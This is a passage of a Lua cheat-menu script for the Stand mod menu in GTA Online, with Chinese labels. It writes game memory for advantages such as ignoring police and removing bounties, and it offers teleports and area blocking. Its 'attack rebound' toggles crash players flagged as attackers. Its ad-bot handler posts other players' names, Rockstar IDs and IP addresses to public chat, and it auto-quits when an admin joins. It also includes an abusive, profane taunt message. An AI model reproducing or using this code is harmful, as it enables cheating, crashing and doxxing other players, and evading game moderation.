    menu.toggle_loop(blockareas, '自定义阻挡', {}, '使您能够通过按"B"来阻挡您面前的区域.', function()
        blocksomewhere()
    end)

    local blocklsc = menu.list(blockareas, '阻挡洛圣都改车王', {'JSblockLSC'}, '阻挡进入洛圣都改车王.')
    local blockcasino = menu.list(blockareas, '阻挡赌场', {'JSblockCasino'}, '阻挡进入赌场.')
    local jsblockcasino = menu.list(blockareas, '阻挡花园银行', {'JSblockCasino'}, '阻挡进入花园银行.')

    local blockAreasActions = {
        --Orbital block
        {root = blockareas, name = '天基炮发射室', coordinates = {{335.95837, 4834.216, -60.99977}}, blocked = false},
        -- Lsc blocks
        {root = blocklsc, name = '伯顿', coordinates = {{-357.66544, -134.26419, 38.23775}}, blocked = false},
        {root = blocklsc, name = 'LSIA', coordinates = {{-1144.0569, -1989.5784, 12.9626}}, blocked = false},
        {root = blocklsc, name = '梅萨', coordinates = {{721.08496, -1088.8752, 22.046721}}, blocked = false},
        {root = blocklsc, name = '布莱恩县', coordinates = {{115.59574, 6621.5693, 31.646144}, {110.460236, 6615.827, 31.660228}}, blocked = false},
        {root = blocklsc, name = '佩立托湾', coordinates = {{115.59574, 6621.5693, 31.646144}, {110.460236, 6615.827, 31.660228}}, blocked = false},
        {root = blocklsc, name = '本尼车坊', coordinates = {{-205.6571, -1309.4313, 31.093222}}, blocked = false},
        -- Casino blocks
        {root = blockcasino, name = '赌场入口', coordinates = {{924.3438, 49.19933, 81.10636}, {922.5348, 45.917263, 81.10635}}, blocked = false},
        {root = blockcasino, name = '赌场车库', coordinates = {{935.29553, -0.5328601, 78.56404}}, blocked = false},
        {root = blockcasino, name = '幸运转盘', coordinates = {{1110.1014, 228.71582, -49.935845}}, blocked = false},
        --Maze bank block
        {root = jsblockcasino, name = '花园银行入口', coordinates = {{-81.18775, -795.82874, 44.227295}}, blocked = false},
        {root = jsblockcasino, name = '花园银行车库', coordinates = {{-77.96956, -780.9376, 38.473335}, {-82.82901, -781.81635, 38.50093}}, blocked = false},
        --Mc block
        {root = blockareas, name = '霍伊会所', coordinates = {{-17.48541, -195.7588, 52.370953}, {-23.452509, -193.01324, 52.36245}}, blocked = false},
        --Arena war garages
        {root = blockareas, name = '竞技场车库', coordinates = {
            {-362.912, -1870.2249, 20.527836}, {-367.41855, -1872.5348, 20.527836},
            {-375.58344, -1874.6719, 20.527828},  {-379.9853, -1876.0894, 20.527828},
            {-386.49762, -1880.2793, 20.527842},  {-390.3558, -1883.0833, 20.527842},
            {-396.9259, -1883.9537, 21.542086}
        }, blocked = false},
    }
        
    
    for i = 1, #blockAreasActions do
        local areaName = blockAreasActions[i].name
        menu.action(blockAreasActions[i].root, '阻挡' ..' '.. areaName, {}, '', function ()
            if not blockAvailable(blockAreasActions[i].blocked, (areaName == '洛圣都国际机场' and areaName or string.capitalize(areaName))) then return end
            setBlockStatus(true)
            blockAreasActions[i].blocked = true
            for j = 1, #blockAreasActions[i].coordinates do
                block(blockAreasActions[i].coordinates[j])
            end
            setBlockStatus(false, areaName)
        end)
    end


local services <const> = menu.list(onlinemode, "服务", {}, "")


menu.action(services, "即时纳米无人机", {}, "", function()
    nanodrone()
end)

menu.action(services, "请求豪华直升机", {}, "", function()
    luxuryhelicopter()
end)

menu.action(services, "即时RC匪徒", {}, "", function()
    bandito()
end)

menu.action(services, "即时遥控RC坦克", {}, "", function ()
    rctank()
end)

TeleRoot = menu.list(onlinemode, '传送', {}, '')

Proptp = menu.list(TeleRoot, '资产传送', {'tpprop'}, '传送到所拥有的资产', function()
    tp_prop()
end)

local vteles = menu.list(TeleRoot, '载具传送', {}, '')

menu.action(vteles, '传送到复仇者', {'tpaven'}, '传送到设施', function ()
    tp_aven()
end)

menu.action(vteles, '传送到虎鲸', {'tpkosatka'}, '传送到佩里科岛抢劫面板', function ()
    tp_kosa()
end)

menu.action(vteles, '传送到机动作战中心', {'tpMOC'}, '传送到地堡', function ()
    tp_moc()
end)

menu.action(vteles, '传送到恐霸', {'tpterro'}, '传送到夜总会', function ()
    tp_terro()
end)

local cargoteles = menu.list(TeleRoot, 'CEO仓库传送', {}, '')

menu.action(cargoteles, '传送到特殊货物', {'tpscargo'}, '传送并拾取特殊货物', function ()
    tp_scargo()
end)

menu.action(cargoteles, '传送到载具货物', {'tpvcargo'}, '传送并拾取载具货物', function ()
    tp_vcargo()
end)

local intteles = menu.list(TeleRoot, '室内传送', {}, '')

menu.action(intteles, '传送到电脑', {'tpdesk'}, '传送到办公桌上的电脑', function ()
    tp_desk()
end)

menu.action(intteles, '传送到夜总会的人', {'tpNCPerson'}, '传送到需要接送的夜总会员工', function ()
    tp_NCperson()
end)

menu.action(intteles, '传送到保险柜', {'tpsafe'}, '传送到事务所/游戏厅/夜总会内的保险箱', function ()
    tp_safe()
end)

menu.action(TeleRoot, '传送到摩托帮货物', {'tpMCproduct'}, '传送并拾取摩托帮货物', function ()
    tp_mcproduct()
end)

menu.action(TeleRoot, '传送到地堡货物', {'tpBSupplies'}, '传送并拾取地堡货物', function ()
    tp_bsupplies()
end)

menu.action(TeleRoot, '传送到公共电话亭', {'tppayphone'}, '传送到公共电话亭(必须已经打电话给富兰克林请求暗杀差事)', function ()
    tp_payphone()
end)

menu.action(TeleRoot, '传送到出口码头', {'tpEED'}, '传送到出口码头', function ()
    tp_eed()
end)

menu.list_action(onlinemode, "宣布", {"announcestat"}, "", { "最佳抢劫目标", "最穷的玩家", "最富的玩家", "最性奋的玩家"}, function(index, value, click_type)
    local ret = nil
    pluto_switch index do 
        case 1: 
            ret = get_best_mug_target()
            break
        case 2: 
            ret = get_poorest_player()
            break
        case 3:
            ret = get_richest_player()
            break
        case 4:
            ret = get_horniest_player()
            break
    end
    if ret ~= nil then
        chat.send_message(ret, false, true, true)
    end
end)

    onlineuse = menu.list(onlinemode, '其他', {}, '')

    menu.divider(onlineuse, "无视犯罪")

    menu.action(onlineuse, "警察无视犯罪", { "no_cops" }, "莱斯特", function()
        SET_INT_GLOBAL(2815059 + 4624, 5)
        SET_INT_GLOBAL(2815059 + 4625, 1)
        SET_INT_GLOBAL(2815059 + 4627, NETWORK.GET_NETWORK_TIME())
    end)
    
    menu.action(onlineuse, "贿赂当局", {}, "CEO技能", function()
        SET_INT_GLOBAL(2815059 + 4624, 81)
        SET_INT_GLOBAL(2815059 + 4625, 1)
        SET_INT_GLOBAL(2815059 + 4627, NETWORK.GET_NETWORK_TIME())
    end)
    
    menu.toggle_loop(onlineuse, "锁定倒计时", {}, "无视犯罪的倒计时", function()
        SET_INT_GLOBAL(2815059 + 4627, NETWORK.GET_NETWORK_TIME())
    end)
    
    menu.divider(onlineuse, "")
    
    local other_options_SnackArmour = menu.list(onlineuse, "零食护甲编辑", {}, "")
    
    menu.action(other_options_SnackArmour, "补满全部零食", {}, "", function()
        STAT_SET_INT("NO_BOUGHT_YUM_SNACKS", 30)
        STAT_SET_INT("NO_BOUGHT_HEALTH_SNACKS", 15)
        STAT_SET_INT("NO_BOUGHT_EPIC_SNACKS", 5)
        STAT_SET_INT("NUMBER_OF_ORANGE_BOUGHT", 10)
        STAT_SET_INT("NUMBER_OF_BOURGE_BOUGHT", 10)
        STAT_SET_INT("NUMBER_OF_CHAMP_BOUGHT", 5)
        STAT_SET_INT("CIGARETTES_BOUGHT", 20)
        util.toast("完成！")
    end)
    
    menu.action(other_options_SnackArmour, "补满全部护甲", {}, "", function()
        STAT_SET_INT("MP_CHAR_ARMOUR_1_COUNT", 10)
        STAT_SET_INT("MP_CHAR_ARMOUR_2_COUNT", 10)
        STAT_SET_INT("MP_CHAR_ARMOUR_3_COUNT", 10)
        STAT_SET_INT("MP_CHAR_ARMOUR_4_COUNT", 10)
        STAT_SET_INT("MP_CHAR_ARMOUR_5_COUNT", 10)
        util.toast("完成！")
    end)
    
    menu.action(other_options_SnackArmour, "补满呼吸器", {}, "", function()
        STAT_SET_INT("BREATHING_APPAR_BOUGHT", 20)
        util.toast("完成！")
    end)
    
    menu.divider(other_options_SnackArmour, "零食")

    menu.click_slider(other_options_SnackArmour, "PQ豆", {}, "+15 Health", 0, 99, 30, 1, function(value)
        STAT_SET_INT("NO_BOUGHT_YUM_SNACKS", value)
        util.toast("完成！")
    end)
    menu.click_slider(other_options_SnackArmour, "宝力旺", {}, "+45 Health", 0, 99, 15, 1, function(value)
        STAT_SET_INT("NO_BOUGHT_HEALTH_SNACKS", value)
        util.toast("完成！")
    end)
    menu.click_slider(other_options_SnackArmour, "麦提来", {}, "+30 Health", 0, 99, 5, 1, function(value)
        STAT_SET_INT("NO_BOUGHT_EPIC_SNACKS", value)
        util.toast("完成！")
    end)
    menu.click_slider(other_options_SnackArmour, "易可乐", {}, "+36 Health", 0, 99, 10, 1, function(value)
        STAT_SET_INT("NUMBER_OF_ORANGE_BOUGHT", value)
        util.toast("完成！")
    end)
    menu.click_slider(other_options_SnackArmour, "尿汤啤", {}, "", 0, 99, 10, 1, function(value)
        STAT_SET_INT("NUMBER_OF_BOURGE_BOUGHT", value)
        util.toast("完成！")
    end)
    menu.click_slider(other_options_SnackArmour, "蓝醉香槟", {}, "", 0, 99, 5, 1, function(value)
        STAT_SET_INT("NUMBER_OF_CHAMP_BOUGHT", value)
        util.toast("完成！")
    end)
    menu.click_slider(other_options_SnackArmour, "香烟", {}, "-5 Health", 0, 99, 20, 1, function(value)
        STAT_SET_INT("CIGARETTES_BOUGHT", value)
        util.toast("完成！")
    end)

    menu.action(onlineuse, "请求重型装甲", {}, "请求弹道装甲和火神机枪", function()
        SET_INT_GLOBAL(2815059 + 884, 1)
    end)
    
    menu.action(onlineuse, "重型装甲包裹 传送到我", {}, "", function()
        local entity_model_hash = 1688540826
        for k, ent in pairs(entities.get_all_pickups_as_handles()) do
            local EntityHash = ENTITY.GET_ENTITY_MODEL(ent)
            if EntityHash == entity_model_hash and ENTITY.IS_ENTITY_A_MISSION_ENTITY(ent) then
                local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0.0, 2.0, 0.0)
                ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
            end
        end
    end)


    menu.toggle(onlinemode, "结束种族主义", {"endracism"}, "自动踢掉说脏话的玩家.", function(on)
        end_racism = on
    end)
    
    menu.toggle(onlinemode, "结束同性恋", {"endhomophobia"}, "自动踢出男同言论的玩家.", function(on)
        end_homophobia = on
    end)

    chat.on_message(function(packet_sender, message_sender, text, team_chat)
        toxicshit(packet_sender, message_sender, text, team_chat)
    end)


	require("lib.GTlib.gt_1")


    adbotblock = menu.list(protex, "广告机拦截", {"blockidiotbot"}, "自动踢出聊天频道里面发送广告的傻子", function(on)
    end)
    
    menu.divider(adbotblock, "[抢战局主机效果更佳,主机模式秒踢广告机,无敌广告机都没用]")

    kick_ad_bot = false
    menu.toggle(adbotblock, "启用拦截广告", {"blockidiotbot"}, "自动踢出聊天频道里面发送广告的傻逼", function(on)
        kick_ad_bot = on
    end)

    kick_ad_bot_chat = 1
    menu.slider_text(adbotblock, "发送踢出内容", {"blockidiotbot"}, "发送踢出内容到公屏", {"通知","Stand通知","团队聊天不联网", "团队聊天联网", "全局聊天不联网", "全局聊天联网"}, function(s)
        kick_ad_bot_chat = s
    end)

    chat.on_message(function(sender_player_id, sender_player_name, message, is_team_chat)
        if kick_ad_bot then 
        if sender_player_id ~= players.user() then
            for n, w in pairs(banned_words) do
                if string.find(string.lower(message), w) then
                    if (kick_ad_bot_chat == 1) then	
                        notification("检测到广告机\n昵称:"..players.get_name(sender_player_name).."\nRID:"..players.get_rockstar_id(sender_player_name).. "\nIP:"..get_external_ip(sender_player_name) .." 已自动踢出.", colors.blue)
                    end if (kick_ad_bot_chat == 2) then	
                        util.toast("检测到广告机\n昵称:"..players.get_name(sender_player_name).."\nRID:"..players.get_rockstar_id(sender_player_name).. "\nIP:"..get_external_ip(sender_player_name) .." 已自动踢出.")
                    end if (kick_ad_bot_chat == 3) then
                        chat.send_message("检测到广告机\n昵称:"..players.get_name(sender_player_name).."\nRID:"..players.get_rockstar_id(sender_player_name).. "\nIP:"..get_external_ip(sender_player_name) .." 已自动踢出.", true, true, false)
                    end if (kick_ad_bot_chat == 4) then
                        chat.send_message("检测到广告机\n昵称:"..players.get_name(sender_player_name).."\nRID:"..players.get_rockstar_id(sender_player_name).. "\nIP:"..get_external_ip(sender_player_name) .." 已自动踢出.", true, true, true)
                    end if (kick_ad_bot_chat == 5) then
                        chat.send_message("检测到广告机\n昵称:"..players.get_name(sender_player_name).."\nRID:"..players.get_rockstar_id(sender_player_name).. "\nIP:"..get_external_ip(sender_player_name) .." 已自动踢出.", false, true, false)
                    end if (kick_ad_bot_chat == 6) then
                        chat.send_message("检测到广告机\n昵称:"..players.get_name(sender_player_name).."\nRID:"..players.get_rockstar_id(sender_player_name).. "\nIP:"..get_external_ip(sender_player_name) .." 已自动踢出.", false, true, true)
                    end
                    util.log("检测到广告机昵称 "..players.get_name(sender_player_name).." RID:"..players.get_rockstar_id(sender_player_name).. " IP:"..get_external_ip(sender_player_name) .." 已自动踢出.")
                    if players.exists(sender_player_name) then
                    menu.trigger_commands("networkbail ".. players.get_name(sender_player_name))
                    end
                    if players.exists(sender_player_name) then
                    menu.trigger_commands("invitehome ".. players.get_name(sender_player_name))
                    end
                    if players.exists(sender_player_name) then
                    menu.trigger_commands("tpcayo ".. players.get_name(sender_player_name))
                    end
                    if players.exists(sender_player_name) then
                    menu.trigger_commands("gotobeach ".. players.get_name(sender_player_name))
                    end
                    if players.exists(sender_player_name) then
                    menu.trigger_commands("adaptivekick ".. players.get_name(sender_player_name))
                   end
                end
            end
        end
    end
end)


    local anti_mugger = menu.list(protex, "新拦截劫匪")

    menu.toggle_loop(anti_mugger, "拦截劫匪--自我", {"blockstealerself"}, "防止你被抢劫.", function() 
        blockstealer()
    end)

    menu.toggle_loop(anti_mugger, "拦截劫匪--其他人", {"blockstealermult"}, "防止他人被抢劫.", function()
        blockstealerother()
    end)
    
    menu.toggle_loop(anti_mugger, "显示劫匪", {}, "", function ()
        show_mugger()
    end)

    menu.toggle_loop(anti_mugger, "其他人", {}, "防止他人被抢劫.", function()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if memory.read_int(target) ~= player and memory.read_int(sender) ~= player
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId)) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("拦截劫匪发送来自 " .. players.get_name(memory.read_int(sender)) .. " to " .. players.get_name(memory.read_int(target)))
            end
        end)
    end
end)

    menu.toggle_loop(protex,"无人机 导弹探测", {}, "当玩家驾驶无人机或发射导弹时发出通知，并在附近地图上显示", function ()
        if NETWORK.NETWORK_IS_SESSION_ACTIVE() then
            for player = 0, 32 do AddBlipForPlayerDrone(player) end
        end
    end, function()
        for i in pairs(blips) do RemoveBlipIndex(i) end
        notificationBits = 0
        nearbyNotificationBits = 0
    end)

    local toxic_text = "\n崩你妈个臭逼,崩不掉只会狗叫,你妈是不是骨灰盒被扬了,你他妈的全家是不是吃三鹿奶粉长大的,死脑残!!\n--------¦XIPRO"

    menu.text_input(protex, "自定义嘲讽文字", {"Customizeidicule"}, "", function(value)
        toxic_text = value
    end, toxic_text)

    menu.toggle_loop(protex, "攻击嘲讽1", {"toxic_text"}, "", function()
        for _, pid in ipairs(players.list(false, true, true)) do
            if players.is_marked_as_attacker(pid,1 << 0x03) or players.is_marked_as_attacker(pid,1 << 0x04) or players.is_marked_as_attacker(pid,1 << 0x05) or players.is_marked_as_attacker(pid,1 << 0x0C) or players.is_marked_as_attacker(pid,1 << 0x0D) or players.is_marked_as_attacker(pid,1 << 0x0E) then
                chat.send_message(PLAYER.GET_PLAYER_NAME(pid).. toxic_text,false,true,true)
                    break
                end
            end
    end)

ridicule = "\n你正在攻击一位高贵的用户,请立刻停止你的行为!\n--------¦GT"

menu.text_input(protex, "自定义嘲讽文字", {"Customizeridicule2"}, "", function(value)

    ridicule = value

end, ridicule)

menu.toggle_loop(protex, "攻击嘲讽2", {"ridicule"}, "", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        if players.is_marked_as_attacker(pid,1 << 0x03) or players.is_marked_as_attacker(pid,1 << 0x04) or players.is_marked_as_attacker(pid,1 << 0x05) or players.is_marked_as_attacker(pid,1 << 0x0C) or players.is_marked_as_attacker(pid,1 << 0x0D) or players.is_marked_as_attacker(pid,1 << 0x0E) then
            chat.send_message(PLAYER.GET_PLAYER_NAME(pid)..ridicule,false,true,true)
                break
            end
        end

end)

menu.toggle_loop(protex, "攻击反弹V1", {"crashrebound"}, "", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        if players.is_marked_as_attacker(pid,1 << 0x03) or players.is_marked_as_attacker(pid,1 << 0x04) or players.is_marked_as_attacker(pid,1 << 0x05) or players.is_marked_as_attacker(pid,1 << 0x0C) or players.is_marked_as_attacker(pid,1 << 0x0D) or players.is_marked_as_attacker(pid,1 << 0x0E) then
            menu.trigger_commands("yycrashV2") 
                break
            end
        end

end)

menu.toggle_loop(protex, "攻击反弹V2", {"crashrebound2"}, "", function()


    _U_hack_list={}

    while true do

        util.yield(0)

        for pid=0,31 do

            if pid~= PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID) then

                if players.is_marked_as_attacker(pid,1 << 0x03) or players.is_marked_as_attacker(pid,1 << 0x04) or players.is_marked_as_attacker(pid,1 << 0x05) or players.is_marked_as_attacker(pid,1 << 0x0C) or players.is_marked_as_attacker(pid,1 << 0x0D) or players.is_marked_as_attacker(pid,1 << 0x0E) then

                    if not _U_hack_list[pid+1] then

                        menu.trigger_commands("yycrashV2") 

                        _U_hack_list[pid+1]=true

                    end

                else

                    _U_hack_list[pid+1]=false

                end

            end

        end

    end

end)

menu.toggle(protex, "阻止崩溃", {}, "看个人体质", function(on_toggle)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    local ped = PLAYER.GET_PLAYER_PED(players.user())
    if on_toggle then
        util.yield(300)
        ENTITY.SET_ENTITY_COORDS(ped, 25.030561, 7640.8735, 17.831139, 1, false)
        util.yield(600)
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("trafficpotato on")
        util.yield(2000)
    else        
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("anticrashcamera off")
        menu.trigger_commands("trafficpotato off")
        util.yield(800)
        ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, false)
        util.yield(500)
    end
end)

menu.toggle_loop(protex, "阻止克隆", {""}, "", function()
    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
    if ENTITY.GET_ENTITY_MODEL(ped) == ENTITY.GET_ENTITY_MODEL(players.user_ped()) and not PED.IS_PED_A_PLAYER(ped) and not util.is_session_transition_active() then
        util.toast("检测到克隆模型。清除中......")
        entities.delete_by_handle(ped)
        util.yield(100)
    end
    end
end)

menu.action(protex, "强制停止所有声音事件", {""}, "", function()
		for i=-1,100 do
			AUDIO.STOP_SOUND(i)
			AUDIO.RELEASE_SOUND_ID(i)
		end
	end)

menu.action(protex, "删除手机铃声", {}, "删除手机铃声，让手机不再响铃", function()
    local player = PLAYER.PLAYER_PED_ID()
    menu.trigger_commands("nophonespam on")
    if AUDIO.IS_PED_RINGTONE_PLAYING(player) then
        for i = -1, 100 do
            AUDIO.STOP_PED_RINGTONE(i)
            AUDIO.RELEASE_SOUND_ID(i)
        end

    end
    util.yield(1000)
    menu.trigger_commands("nophonespam off")
end)

    local admin_bail = true
    menu.toggle(protex, "管理员退出", {"adminbail"}, "自动退出战局当一个管理员加入", function(on)
        admin_bail = on
        while admin_bail do
            if util.is_session_started() then
                for _, pid in players.list(false, true, true) do 
                    if players.is_marked_as_admin(pid) then 
                        notify("检测到管理员！快跑！.")
                        menu.trigger_commands("quickbail")
                    end    
                end
            end
            util.yield()
        end
    end, false)


    menu.action(protex, "超级清除", {"superclear"}, "", function()
        removeanything()
	end)

    menu.toggle_loop(protex, "连续清除", {""}, "", function()
        MISC.CLEAR_AREA(0,0,0 , 1000000, true, true, true, true)
    end)

    menu.action(protex, "清除自身", {}, "", function()
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
    else
        menu.trigger_commands("mpfemale")
    end
end)

    menu.list_action(protex, "清除全部", {}, "", {"NPC", "载具", "物体", "可拾取物体", "货车", "发射物", "声音"}, function(index, name)
        clearall(index, name)
    end)
    local OrbitalCannon = require "lib.GTlib.orbital_cannon"
        local orb = menu.list(protex, "反天基炮")
local ghost = menu.list(orb, "幽灵模式")
ghost_tgl = menu.toggle_loop(ghost, "幽灵模式", {"ghostorb"}, "自动对使用天基炮的玩家开启幽灵模式.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local cam_pos = players.get_cam_pos(pid)
        if IsPlayerUsingOrbitalCannon(pid) and TASK.GET_IS_TASK_ACTIVE(ped, 135)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), cam_pos) < 400
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), cam_pos) > 340 then
            util.toast(players.get_name(pid) .. " 天基炮正在瞄准你")
        end
       if IsPlayerUsingOrbitalCannon(pid) then
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, true)
        else
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
        end
    end
end, function()
    for _, pid in ipairs(players.list(false, true, true)) do
        NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
    end
end)

menu.toggle_loop(protex, "阻止观看同步", {}, "阻止所有观看你的人的同步.", function()
    for _, pid in players.list(false, true, true) do
        if players.exists(pid) then
            if v3.distance(players.get_position(players.user()), players.get_cam_pos(pid)) < 15.0 then
                outgoingSyncs = menu.ref_by_rel_path(menu.player_root(pid), "Outgoing Syncs>Block")
                outgoingSyncs.value = true
                pos = players.get_position(players.user())
                if v3.distance(pos, players.get_cam_pos(pid)) < 25.0 then
                    repeat 
                        util.yield()
                    until v3.distance(pos, players.get_cam_pos(pid)) > 25.0 
                    outgoingSyncs.value = false
                end
            end
        end
    end
end)

menu.toggle_loop(ghost, "被锁定时", {}, "自动将用天基炮瞄准你的玩家变成幽灵模式.", function()
    if menu.get_value(ghost_tgl) then
        menu.set_value(tgl, false)
    return end
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local cam_pos = players.get_cam_pos(pid)
        if IsPlayerUsingOrbitalCannon(pid) and TASK.GET_IS_TASK_ACTIVE(ped, 135) 
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), cam_pos) < 400
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), cam_pos) > 340 then
            util.toast(players.get_name(pid) .. " Is targeting you with the orbital cannon")
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, true)
        end
    end
end, function()
    for _, pid in ipairs(players.list(false, true, true)) do
        NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
    end
end)

annoy = menu.list(orb, "防御模式", {}, "快速显示你的名字并将其从目标玩家天基炮选择列表中删除.")
orb_delay = 1000
menu.list_select(annoy, "延迟", {}, "对于天基炮玩家来说，你的名字会以何种速度闪动.", {"慢速", "中速", "快速"}, 1, function(index, value)
switch value do
    case "慢速":
        orb_delay = 1000
        break
    case "中速":
        orb_delay = 500
        break
    case "快速":
        orb_delay = 100
        break
    end
end)

local annoy_tgl
annoy_tgl = menu.toggle_loop(protex, "启用", {}, "", function()
    if menu.get_value(ghost_tgl) then
        menu.set_value(annoy_tgl, false)
        util.toast("请不要同时启用防御模式和幽灵模式 ;)")
    return end
    
    for _, pid in ipairs(players.list(false, true, true)) do
       if IsPlayerUsingOrbitalCannon(pid) then
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, true)
            util.yield(orb_delay)
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
            util.yield(orb_delay)
        else
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
        end
    end
end, function()
    for _, pid in ipairs(players.list(false, true, true)) do
        NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
    end
end)

menu.toggle_loop(protex, "友好的AI", {""}, "AI不会瞄准你.", function()
    PED.SET_PED_RESET_FLAG(players.user_ped(), 124, true)
end)

    throttler = menu.list(protex, "自动节流器", {}, "")

    require "lib.GTlib.EntityThrottler"

local pool_limiter = menu.list(protex, "实体池限制", {}, "")

    ped_limit = 175

    menu.slider(pool_limiter, "Ped池限制", {"pedslimit"}, "默认为175", 0, 256, 175, 1, function(amount)

        ped_limit = amount

    end)

    

    veh_limit = 150

    menu.slider(pool_limiter, "载具池限制", {"vehlimit"}, "默认为150", 0, 300, 150, 1, function(amount)

        veh_limit = amount

    end)

    

    obj_limit = 500

    menu.slider(pool_limiter, "物体池限制", {"objlimit"}, "默认为500", 0, 2300, 500, 1, function(amount)

        obj_limit = amount

    end)

    

    projectile_limit = 25

    menu.slider(pool_limiter, "投掷物池限制", {"projlimit"}, "默认为25", 0, 50, 25, 1, function(amount)

        projectile_limit = amount

    end)

    

    menu.toggle_loop(pool_limiter, "启用实体池限制", {}, "", function()
        entity_limit()
    end)

	menu.divider(protex, "崩溃保护")

    local block_event_anthing = menu.list(protex, "阻止选项", {}, "", function() end)

    local block_effect = menu.list(protex, "拦截选项", {}, "", function() end)

    menu.toggle_loop(block_effect, "拦截粒子效果", {}, "", function()
        blockcrasheffect()
    end)
    
    menu.toggle_loop(block_effect, "拦截火焰效果", {}, "", function()
        blockfireeffect()
    end)

    menu.toggle_loop(protex, "野兽防护", {}, "防止你被变成野兽，但也会阻止其他人的战局事件.", function()
        antianimal()
    end)

    menu.toggle_loop(protex, "阻止交易错误 ", {}, "阻止一些脚本，利用破坏车辆的方法，让你出现交易错误.", function()
    if util.spoof_script("am_destroy_veh", SCRIPT.TERMINATE_THIS_THREAD) then
        util.toast("检测到破坏车辆脚本。阻止了该脚本功能继续进行...")
    end
end)

menu.toggle_loop(protex, "自动移除赏金", {}, "", function()
    if util.is_session_started() then
        if memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3))) == 1 then
            memory.write_int(memory.script_global(2815059 + 1856 + 17), -1)
            memory.write_int(memory.script_global(2359296 + 1 + 5149 + 13), 2880000)
            notify(translations.removed_bounty ..memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3) + 1)).. " ")
        end
    end
    util.yield(5000)
end)

orb_cannon_prop = nil
block_orb_cannon = fase
menu.toggle_loop(protex, "阻止天基炮", {}, "", function(on)
    block_orb_cannon = on
    while true do 
        if not block_orb_cannon then 
            if orb_cannon_prop ~= nil then 
                entities.delete_by_handle(orb_cannon_prop)
            end
            break
        end
        if orb_cannon_prop == nil or not ENTITY.DOES_ENTITY_EXIST(orb_cannon_prop) then
            local hash = util.joaat("h4_prop_h4_garage_door_01a")
            request_model_load(hash)
            orb_cannon_prop = entities.create_object(hash, {x=0, y=0, z=0})
            ENTITY.SET_ENTITY_HEADING(orb_cannon_prop, 125)
            ENTITY.SET_ENTITY_COORDS(orb_cannon_prop, 335.8, 4833.9, -59)
            ENTITY.FREEZE_ENTITY_POSITION(orb_cannon_prop, true)
        end
        util.yield()
    end
end)

    menu.toggle_loop(protex, "防止笼子", {"anticage"}, "请不要在任务中开启", function()
        anticage()
    end)

	menu.toggle(block_event_anthing, "阻止网络事件", {}, "阻止网络事件传输", function(on_toggle)
        blocknetwork(on_toggle)  
	end)

	menu.toggle(block_event_anthing, "阻止传入", {}, "阻止网络事件传入", function(on_toggle)
        blockincoming(on_toggle)
	end)

	menu.toggle(block_event_anthing, "阻止传出", {}, "阻止网络事件传出", function(on_toggle)
        blockout(on_toggle)
	end)

    menu.toggle_loop(block_event_anthing, "禁用阻止实体轰炸", {}, "将在任务中自动禁用阻止实体轰炸,防止任务卡关.", function()
    local EntitySpam = menu.ref_by_path("Online>Protections>Block Entity Spam>Block Entity Spam")
    if NETWORK.NETWORK_IS_ACTIVITY_SESSION() == true then
        if not menu.get_value(EntitySpam) then return end
        menu.trigger_command(EntitySpam, "off")
    else
        if menu.get_value(EntitySpam) then return end
        menu.trigger_command(EntitySpam, "on")
    end
end)

	menu.toggle(protex, "防崩镜头", {"abcc"}, "", function(on_toggle)
		if on_toggle then
			notification("开启防崩镜头", colors.green)
			menu.trigger_commands("anticrashcam on")
			menu.trigger_commands("potatomode on")
		else
			notification("Toggling anticrashcam off...", colors.red)
			menu.trigger_commands("anticrashcam off")
			menu.trigger_commands("potatomode off")
		end
	end)

	menu.toggle(protex, "自闭模式", {"panic"}, "开启自闭", function(on_toggle)
        chickenmode(on_toggle)
	end)

    action_lua = menu.list(funfeatures, "动作选项", {}, "", function(); end)

    action_lua_load = menu.action(action_lua, "加载动作选项", {""}, "", function()
        notification("正在加载动作脚本,请稍等",colors.blue)
        util.yield(2000)
        require "lib.GTlib.Actions"
        menu.delete(action_lua_load)
    end)

